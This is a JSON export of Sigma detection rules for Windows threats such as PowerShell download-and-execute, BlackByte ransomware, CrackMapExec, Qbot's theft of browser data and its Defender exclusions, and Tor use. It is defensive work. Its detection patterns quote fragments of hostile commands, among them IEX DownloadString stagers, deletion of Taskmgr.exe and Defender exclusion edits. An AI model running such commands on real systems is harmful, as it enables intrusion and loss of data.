[{"categories":null,"contents":"Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nKnown false-positives Software installers that pull packages from remote systems and execute them References https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70 Raw rule (edit) title: Suspicious PowerShell Download and Execute Pattern id: e6c54d94-498c-4562-a37c-b469d8e9a275 status: experimental description: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive) author: Florian Roth references: - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70 date: 2022/02/28 modified: 2022/03/01 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # make sure that your backend applies the strings case-insensitive - \u0026#39;IEX ((New-Object Net.WebClient).DownloadString\u0026#39; - \u0026#39;IEX (New-Object Net.WebClient).DownloadString\u0026#39; - \u0026#39;IEX((New-Object Net.WebClient).DownloadString\u0026#39; - \u0026#39;IEX(New-Object Net.WebClient).DownloadString\u0026#39; - \u0026#39; -command (New-Object System.Net.WebClient).DownloadFile(\u0026#39; - \u0026#39; -c (New-Object System.Net.WebClient).DownloadFile(\u0026#39; condition: selection falsepositives: - Software installers that pull packages from remote systems and execute them level: high tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Download and Execute Pattern"},{"categories":null,"contents":"Enable Dynamic Data Exchange protocol (DDE) in all supported editions of Microsoft Word or Excel.\nKnown false-positives Unknown References https://msrc.microsoft.com/update-guide/vulnerability/ADV170021 Raw rule (edit) title: Enable Microsoft Dynamic Data Exchange id: 63647769-326d-4dde-a419-b925cc0caf42 description: Enable Dynamic Data Exchange protocol (DDE) in all supported editions of Microsoft Word or Excel. author: frack113 date: 2022/02/26 status: experimental references: - https://msrc.microsoft.com/update-guide/vulnerability/ADV170021 logsource: category: registry_event product: windows detection: selection_word: EventType: SetValue TargetObject|endswith: \\Word\\Security\\AllowDDE Details: - DWORD (0x00000001) - DWORD (0x00000002) selection_excel: EventType: SetValue TargetObject|endswith: - \\Excel\\Security\\DisableDDEServerLaunch - \\Excel\\Security\\DisableDDEServerLookup Details: DWORD (0x00000000) condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1559.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_office_enable_dde.yml/","tags":["attack.execution","attack.t1559.002"],"title":"Enable Microsoft Dynamic Data Exchange"},{"categories":null,"contents":"This rule detects suspicious processes with parent images located in the C:\\Users\\Public folder\nKnown false-positives Unknown References https://redcanary.com/blog/blackbyte-ransomware/ Raw rule (edit) title: Parent in Public Folder Suspicious Process id: 69bd9b97-2be2-41b6-9816-fb08757a4d1a status: experimental description: This rule detects suspicious processes with parent images located in the C:\\Users\\Public folder author: Florian Roth references: - https://redcanary.com/blog/blackbyte-ransomware/ date: 2022/02/25 logsource: category: process_creation product: windows detection: selection: ParentImage|startswith: \u0026#39;C:\\Users\\Public\\\u0026#39; CommandLine|contains: - \u0026#39;powershell\u0026#39; - \u0026#39;cmd.exe /c \u0026#39; - \u0026#39;cmd /c \u0026#39; - \u0026#39;wscript.exe\u0026#39; - \u0026#39;cscript.exe\u0026#39; - \u0026#39;bitsadmin\u0026#39; - \u0026#39;certutil\u0026#39; - \u0026#39;mshta.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_public_folder_parent.yml/","tags":null,"title":"Parent in Public Folder Suspicious Process"},{"categories":null,"contents":"Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation\nKnown false-positives Unknown References https://redcanary.com/blog/blackbyte-ransomware/ Raw rule (edit) title: Suspicious MSExchangeMailboxReplication ASPX Write id: 7280c9f3-a5af-45d0-916a-bc01cb4151c9 status: experimental description: Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation references: - https://redcanary.com/blog/blackbyte-ransomware/ author: Florian Roth date: 2022/02/25 tags: - attack.initial_access - attack.t1190 - attack.persistence - attack.t1505.003 logsource: product: windows category: file_event detection: selection: Image|endswith: \u0026#39;\\MSExchangeMailboxReplication.exe\u0026#39; TargetFilename|endswith: - \u0026#39;.aspx\u0026#39; - \u0026#39;.asp\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_exchange_aspx_write.yml/","tags":["attack.initial_access","attack.t1190","attack.persistence","attack.t1505.003"],"title":"Suspicious MSExchangeMailboxReplication ASPX Write"},{"categories":null,"contents":"Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn\u0026rsquo;t contain any command line flags\nKnown false-positives Unknown References https://redcanary.com/blog/blackbyte-ransomware/ Raw rule (edit) title: Suspicious Windows Update Agent Empty Cmdline id: 52d097e2-063e-4c9c-8fbb-855c8948d135 status: experimental description: Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn\u0026#39;t contain any command line flags author: Florian Roth references: - https://redcanary.com/blog/blackbyte-ransomware/ date: 2022/02/26 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\Wuauclt.exe\u0026#39; CommandLine|endswith: \u0026#39;\\Wuauclt.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wuauclt_cmdline.yml/","tags":null,"title":"Suspicious Windows Update Agent Empty Cmdline"},{"categories":null,"contents":"This command line patterns found in BlackByte Ransomware operations\nKnown false-positives Unknown References https://redcanary.com/blog/blackbyte-ransomware/ Raw rule (edit) title: BlackByte Ransomware Patterns id: 999e8307-a775-4d5f-addc-4855632335be status: experimental description: This command line patterns found in BlackByte Ransomware operations author: Florian Roth references: - https://redcanary.com/blog/blackbyte-ransomware/ date: 2022/02/25 logsource: category: process_creation product: windows detection: selection1: Image|startswith: \u0026#39;C:\\Users\\Public\\\u0026#39; CommandLine|contains: \u0026#39; -single \u0026#39; selection2: CommandLine|contains: - \u0026#39;del C:\\Windows\\System32\\Taskmgr.exe\u0026#39; - \u0026#39;;Set-Service -StartupType Disabled $\u0026#39; - \u0026#39;powershell -command \u0026#34;$x =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\u0026#39; - \u0026#39; do start wordpad.exe /p \u0026#39; condition: 1 of selection* fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_ransom_blackbyte.yml/","tags":null,"title":"BlackByte Ransomware Patterns"},{"categories":null,"contents":"This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nKnown false-positives Unknown References https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local https://www.mandiant.com/resources/telegram-malware-iranian-espionage https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject Raw rule (edit) title: CrackMapExec Command Line Flags id: 42a993dd-bb3e-48c8-b372-4d6684c4106c status: experimental description: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced. author: Florian Roth references: - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local - https://www.mandiant.com/resources/telegram-malware-iranian-espionage - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject date: 2022/02/25 logsource: category: process_creation product: windows detection: selection_special: CommandLine|contains: - \u0026#39; -M pe_inject \u0026#39; selection_execute: CommandLine|contains|all: - \u0026#39; --local-auth\u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -x \u0026#39; selection_hash: CommandLine|contains|all: - \u0026#39; --local-auth\u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -p \u0026#39; - \u0026#34; -H \u0026#39;NTHASH\u0026#39;\u0026#34; selection_module_mssql: CommandLine|contains|all: - \u0026#39; mssql \u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -p \u0026#39; - \u0026#39; -M \u0026#39; - \u0026#39; -d \u0026#39; selection_module_smb1: CommandLine|contains|all: - \u0026#39; smb \u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -H \u0026#39; - \u0026#39; -M \u0026#39; - \u0026#39; -o \u0026#39; selection_module_smb2: CommandLine|contains|all: - \u0026#39; smb \u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -p \u0026#39; - \u0026#39; --local-auth\u0026#39; part_localauth_1: CommandLine|contains|all: - \u0026#39; --local-auth\u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -p \u0026#39; part_localauth_2: CommandLine|contains|all: - \u0026#39; 10.\u0026#39; - \u0026#39; 192.168.\u0026#39; - \u0026#39;/24 \u0026#39; condition: 1 of selection* or all of part_localauth* fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_flags.yml/","tags":null,"title":"CrackMapExec Command Line Flags"},{"categories":null,"contents":"Detects suspicious sub processes started by the ScreenConnect client service, which indicates the use of the so-called Backstage mode\nKnown false-positives Case in which administrators are allowed to use ScreenConnect\u0026rsquo;s Backstage mode References https://www.mandiant.com/resources/telegram-malware-iranian-espionage https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode Raw rule (edit) title: ScreenConnect Backstage Mode Anomaly id: 7b582f1a-b318-4c6a-bf4e-66fe49bf55a5 description: Detects suspicious sub processes started by the ScreenConnect client service, which indicates the use of the so-called Backstage mode status: experimental references: - https://www.mandiant.com/resources/telegram-malware-iranian-espionage - https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode tags: - attack.command_and_control - attack.t1219 author: Florian Roth date: 2022/02/25 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: \u0026#39;ScreenConnect.ClientService.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; condition: selection falsepositives: - Case in which administrators are allowed to use ScreenConnect\u0026#39;s Backstage mode level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_screenconnect_anomaly.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"ScreenConnect Backstage Mode Anomaly"},{"categories":null,"contents":"Detects disabling the CrashDump per registry (as used by HermeticWiper)\nKnown false-positives Legitimate disabling of crashdumps References https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/ Raw rule (edit) title: CrashControl CrashDump Disabled id: 2ff692c2-4594-41ec-8fcb-46587de769e0 status: experimental description: Detects disabling the CrashDump per registry (as used by HermeticWiper) author: Tobias Michalski date: 2022/02/24 references: - https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/ tags: - attack.t1564 - attack.t1112 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: \u0026#39;SYSTEM\\CurrentControlSet\\Control\\CrashControl\u0026#39; Details: \u0026#39;DWORD (0x00000000)\u0026#39; condition: selection falsepositives: - Legitimate disabling of crashdumps level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_crashdump_disabled.yml/","tags":["attack.t1564","attack.t1112"],"title":"CrashControl CrashDump Disabled"},{"categories":null,"contents":"Detects suspicious scheduled task creations from a parent stored in a temporary folder\nKnown false-positives Software installers that run from temporary folders and also install scheduled tasks References https://app.any.run/tasks/649e7b46-9bec-4d05-98a5-dfa9a13eaae5/ Raw rule (edit) title: Suspicious Add Scheduled Task Parent id: 9494479d-d994-40bf-a8b1-eea890237021 description: Detects suspicious scheduled task creations from a parent stored in a temporary folder status: experimental references: - https://app.any.run/tasks/649e7b46-9bec-4d05-98a5-dfa9a13eaae5/ tags: - attack.execution - attack.t1053.005 author: Florian Roth date: 2022/02/23 modified: 2022/02/24 logsource: product: windows category: process_creation detection: selection: Image|endswith: \u0026#39;schtasks.exe\u0026#39; CommandLine|contains: \u0026#39;/Create \u0026#39; ParentImage|contains: - \u0026#39;\\AppData\\Local\\\u0026#39; - \u0026#39;\\AppData\\Roaming\\\u0026#39; - \u0026#39;\\Temporary Internet\u0026#39; - \u0026#39;\\Users\\Public\\\u0026#39; filter: CommandLine|contains: - \u0026#39;update_task.xml\u0026#39; - \u0026#39;unattended.ini\u0026#39; condition: selection and not 1 of filter* falsepositives: - Software installers that run from temporary folders and also install scheduled tasks level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_schtasks_parent.yml/","tags":["attack.execution","attack.t1053.005"],"title":"Suspicious Add Scheduled Task Parent"},{"categories":null,"contents":"Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks\nKnown false-positives Unknown how many legitimate software products use that method References https://twitter.com/ORCA6665/status/1496478087244095491 Raw rule (edit) title: Explorer NOUACCHECK Flag id: 534f2ef7-e8a2-4433-816d-c91bccde289b status: test description: Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks author: Florian Roth references: - https://twitter.com/ORCA6665/status/1496478087244095491 date: 2022/02/23 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\explorer.exe\u0026#39; CommandLine|contains: \u0026#39;/NOUACCHECK\u0026#39; condition: selection falsepositives: - Unknown how many legitimate software products use that method level: high tags: - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_explorer_nouaccheck.yml/","tags":["attack.defense_evasion","attack.t1548.002"],"title":"Explorer NOUACCHECK Flag"},{"categories":null,"contents":"The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain. You can use it to reset the password of the local computer.\nKnown false-positives Administrator PowerShell scripts References https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1 https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ Raw rule (edit) title: Suspicious Computer Machine Password by PowerShell id: e3818659-5016-4811-a73c-dde4679169d2 status: experimental description: The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain. You can use it to reset the password of the local computer. references: - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1 - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ author: frack113 date: 2022/02/21 logsource: product: windows category: ps_module detection: selection: ContextInfo|contains: \u0026#39;Reset-ComputerMachinePassword\u0026#39; condition: selection falsepositives: - Administrator PowerShell scripts level: medium tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_suspicious_reset_computermachinepassword.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Suspicious Computer Machine Password by PowerShell"},{"categories":null,"contents":"Detects DNS resolution of an .onion address related to Tor routing networks\nKnown false-positives Unknown References https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/ Raw rule (edit) title: Query Tor Onion Address id: b55ca2a3-7cff-4dda-8bdd-c7bfa63bf544 status: experimental description: Detects DNS resolution of an .onion address related to Tor routing networks references: - https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/ author: frack113 date: 2022/02/20 logsource: product: windows category: dns_query detection: selection: QueryName|contains: \u0026#39;.onion\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1090.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_tor_onion.yml/","tags":["attack.command_and_control","attack.t1090.003"],"title":"Query Tor Onion Address"},{"categories":null,"contents":"Detects the use of Tor or Tor-Browser to connect to onion routing networks\nKnown false-positives Unknown References https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/ Raw rule (edit) title: Tor Client or Tor Browser Use id: 62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c status: experimental description: Detects the use of Tor or Tor-Browser to connect to onion routing networks references: - https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/ author: frack113 date: 2022/02/20 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\tor.exe\u0026#39; - \u0026#39;\\Tor Browser\\Browser\\firefox.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1090.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tor_browser.yml/","tags":["attack.command_and_control","attack.t1090.003"],"title":"Tor Client or Tor Browser Use"},{"categories":null,"contents":"The Windows Firewall service failed to load Group Policy.\nReferences https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) Raw rule (edit) title: Failed to Load Policy in Windows Firewall with Advanced Security id: 7ec15688-fd24-4177-ba43-1a950537ee39 status: experimental description: The Windows Firewall service failed to load Group Policy. author: frack113 date: 2022/02/19 references: - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don\u0026#39;t use Windows Server 2008 R2 detection: selection: EventID: 2009 condition: selection level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/firewall_as/win_firewall_as_failed.yml/","tags":null,"title":"Failed to Load Policy in Windows Firewall with Advanced Security"},{"categories":null,"contents":"A rule has been modified in the Windows Firewall exception list\nReferences https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) Raw rule (edit) title: Modified Rule in Windows Firewall with Advanced Security id: 5570c4d9-8fdd-4622-965b-403a5a101aa0 status: experimental description: A rule has been modified in the Windows Firewall exception list author: frack113 date: 2022/02/19 references: - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don\u0026#39;t use Windows Server 2008 R2 detection: selection: EventID: 2005 filter: ModifyingApplication|startswith: - \u0026#39;C:\\Program Files (x86)\\\u0026#39; - \u0026#39;C:\\Program Files\\\u0026#39; condition: selection and not 1 of filter* level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/firewall_as/win_firewall_as_change_rule.yml/","tags":null,"title":"Modified Rule in Windows Firewall with Advanced Security"},{"categories":null,"contents":"Windows Firewall has been reset to its default configuration.\nReferences https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) Raw rule (edit) title: Reset to Default Configuration Windows Firewall with Advanced Security id: 04b60639-39c0-412a-9fbe-e82499c881a3 status: experimental description: Windows Firewall has been reset to its default configuration. author: frack113 date: 2022/02/19 references: - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don\u0026#39;t use Windows Server 2008 R2 detection: selection: EventID: 2032 condition: selection level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/firewall_as/win_firewall_as_reset.yml/","tags":null,"title":"Reset to Default Configuration Windows Firewall with Advanced Security"},{"categories":null,"contents":"Setting have been change in Windows Firewall\nReferences https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) Raw rule (edit) title: Setting Change in Windows Firewall with Advanced Security id: 00bb5bd5-1379-4fcf-a965-a5b6f7478064 status: experimental description: Setting have been change in Windows Firewall author: frack113 date: 2022/02/19 references: - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don\u0026#39;t use Windows Server 2008 R2 detection: selection: EventID: - 2002 # A Windows Firewall setting has changed. - 2003 # A Windows Firewall setting in the %1 profile has changed. - 2008 # Windows Firewall Group Policy settings have changed. The new settings have been applied - 2010 # Network profile changed on an interface. condition: selection level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/firewall_as/win_firewall_as_setting_change.yml/","tags":null,"title":"Setting Change in Windows Firewall with Advanced Security"},{"categories":null,"contents":"Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute\nKnown false-positives Unknown References https://twitter.com/0gtweet/status/1493963591745220608?s=20\u0026amp;t=xUg9DsZhJy1q9bPTUWgeIQ Raw rule (edit) title: Wlrmdr Lolbin Use as Laucher id: 9cfc00b6-bfb7-49ce-9781-ef78503154bb status: experimental description: Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute references: - https://twitter.com/0gtweet/status/1493963591745220608?s=20\u0026amp;t=xUg9DsZhJy1q9bPTUWgeIQ author: frack113 date: 2022/02/16 modified: 2022/02/21 logsource: category: process_creation product: windows detection: selection: Image|endswith: wlrmdr.exe CommandLine|contains|all: - \u0026#39;-s \u0026#39; - \u0026#39;-f \u0026#39; - \u0026#39;-t \u0026#39; - \u0026#39;-m \u0026#39; - \u0026#39;-a \u0026#39; - \u0026#39;-u \u0026#39; filter: ParentImage: \u0026#39;C:\\Windows\\System32\\winlogon.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbin_wlrmdr.yml/","tags":["attack.defense_evasion"],"title":"Wlrmdr Lolbin Use as Laucher"},{"categories":null,"contents":"Posssible Payload Obfuscation\nKnown false-positives legitimate use References https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf Raw rule (edit) title: Suspicious Dosfuscation Character in Commandline id: a77c1610-fc73-4019-8e29-0f51efc04a51 status: experimental description: Posssible Payload Obfuscation references: - https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf author: frack113 date: 2022/02/15 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;^^\u0026#39; # - \u0026#39;\u0026#34;\u0026#34;\u0026#39; - \u0026#39;,;,\u0026#39; - \u0026#39;%COMSPEC:~\u0026#39; # - \u0026#39;%%\u0026#39; # - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39; s^et \u0026#39; - \u0026#39; s^e^t \u0026#39; - \u0026#39; se^t \u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cmd_dosfuscation.yml/","tags":["attack.execution","attack.t1059"],"title":"Suspicious Dosfuscation Character in Commandline"},{"categories":null,"contents":"One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe\nKnown false-positives legitimate use References https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ https://redcanary.com/threat-detection-report/threats/qbot/ Raw rule (edit) title: Esentutl Steals Browser Information id: 6a69f62d-ce75-4b57-8dce-6351eb55b362 status: experimental description: One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe references: - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ - https://redcanary.com/threat-detection-report/threats/qbot/ author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\esentutl.exe CommandLine|contains|all: - \u0026#39;/r \u0026#39; - \u0026#39;\\Windows\\WebCache\u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.collection - attack.t1005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml/","tags":["attack.collection","attack.t1005"],"title":"Esentutl Steals Browser Information"},{"categories":null,"contents":"Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.\nKnown false-positives legitimate use References https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ https://redcanary.com/threat-detection-report/threats/qbot/ Raw rule (edit) title: Registry Defender Exclusions id: 48917adc-a28e-4f5d-b729-11e75da8941f status: experimental description: Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData. references: - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ - https://redcanary.com/threat-detection-report/threats/qbot/ author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\reg.exe CommandLine|contains: - \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\u0026#39; CommandLine|contains|all: - \u0026#39;ADD \u0026#39; - \u0026#39;/t \u0026#39; - \u0026#39;REG_DWORD \u0026#39; - \u0026#39;/v \u0026#39; - \u0026#39;/d \u0026#39; - \u0026#39;0\u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Registry Defender Exclusions"},{"categories":null,"contents":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nKnown false-positives legitimate use References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows Raw rule (edit) title: GoToAssist Temporary Installation Artefact id: 5d756aee-ad3e-4306-ad95-cb1abec48de2 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows author: frack113 date: 2022/02/13 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: \u0026#39;\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\\u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_gotoopener_artefact.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"GoToAssist Temporary Installation Artefact"},{"categories":null,"contents":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows Raw rule (edit) title: Query to GoToAssist Remote Access Software Domain id: 7c4cf8e0-1362-48b2-a512-b606d2065d7d status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows author: frack113 date: 2022/02/13 logsource: product: windows category: dns_query detection: selection: QueryName|endswith: \u0026#39;.getgo.com\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_gotoopener.yml/","tags":null,"title":"Query to GoToAssist Remote Access Software Domain"},{"categories":null,"contents":"load malicious registered COM objects\nKnown false-positives legitimate use References https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md Raw rule (edit) title: Rundll32 Registered COM Objects id: f1edd233-30b5-4823-9e6a-c4171b24d316 status: experimental description: load malicious registered COM objects references: - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\rundll32.exe CommandLine|contains: - \u0026#39;-sta \u0026#39; - \u0026#39;–localserver \u0026#39; 